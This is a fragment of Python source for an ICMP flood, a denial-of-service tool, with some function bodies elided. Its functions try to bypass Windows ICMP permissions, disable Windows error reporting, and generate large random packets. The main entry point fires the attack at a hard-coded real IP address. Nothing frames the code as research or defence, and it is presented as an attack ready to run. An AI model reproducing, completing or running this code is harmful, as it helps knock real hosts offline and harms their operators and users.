...
def icmp_permission_bypass():
    try:
        if platform.system().lower() == "windows":
            ...
            logger.info("Trying to bypass ICMP permission...")
        else:
            logger.info("Permission bypass not required for non-Windows systems.")
    except Exception as e:
        logger.warning(f"Permission bypass failed: {e}")
...
def complex_icmp_attack(targets, data):
    logger.info(f"Attacking {len(targets)} targets")
...
def prepare_attack(IP_ADDRESS, PACKET_SIZE=50411):
    disable_windows_error_reporting()
    data = os.urandom(PACKET_SIZE)
    targets = [IP_ADDRESS]
    return targets, data

def start_icmp_attack(IP_ADDRESS, PACKET_SIZE=50411):
    targets, data = prepare_attack(IP_ADDRESS, PACKET_SIZE)
    if not targets:
...
if __name__ == "__main__":
    start_icmp_attack("89.185.85.62")
